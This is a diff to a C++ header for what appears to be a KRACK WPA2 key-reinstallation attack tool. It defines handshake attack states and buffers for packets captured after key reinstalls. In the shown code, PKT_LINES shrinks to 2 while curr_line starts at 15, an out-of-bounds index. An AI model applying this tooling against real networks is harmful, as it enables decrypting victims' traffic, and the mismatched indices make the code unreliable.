@@ -7,7 +7,7 @@
 #include "crypto.h"
 
 /** Number of arrays which hold the encrypted packets */
-#define PKT_LINES 16
+#define PKT_LINES 2
 
 /** Collect X data frames before replaying Msg3 */
 #define DATA_FRAMES_COLLECTION_LIMIT 3
@@ -18,7 +18,7 @@ enum attack_state
 	MSG1_RCVD,
 	MSG2_RCVD,
 	MSG3_RCVD,	// Msg3 received but not forwarded
-	MSG3_FWD,	// Msg3 forwarded, victim is sending data frames
+	MSG3_FWD,	// Msg3 forwarded
 	MSG4_RCVD,	// Msg4 received but not forwarded
 	MSG4_FWD	// Msg4 forwarded, key could be installed on authenticator
 };
@@ -70,6 +70,13 @@ public:
 	std::vector<raw_ieee80211pkt> msg3_buf;
 	std::vector<raw_ieee80211pkt> msg4_buf;
 
+	/** Encrypted packets, captured after each reinstall of the key.
+	 * Useful for immidiate decryption attempts
+	 */
+	std::vector<ccmp_pkt> ccmp_pkt_lines[PKT_LINES];
+
+	/** Index of currently used encrypted packet line */
+	uint8_t curr_line = 15;
 
 private:
 	/**
@@ -77,19 +84,13 @@ private:
 	 */
 	ClientInfo *client;
 
-	/** Encrypted packets, captured after each reinstall of the key.
-	 * Useful for immidiate decryption attempts
-	 */
-	std::vector<ccmp_pkt> ccmp_pkt_line[PKT_LINES];
-
-	/** Index of currently used encrypted packet line */
-	uint8_t curr_line = 15;
-
 	/** Last seen packet number used for ccmp nonce. */
 	uint64_t last_pn = 0;
 
+	uint8_t icmp_pkt[100] = {0};
+
 	/** XORed plaintext packets, formely encrypted with the same nonce */
-	std::vector<ccmp_xored_pkts> xored_pkts;
+	std::vector<ccmp_xored_pkt> xored_pkts;
 };
 
 #endif //KRACKSTATE_H__
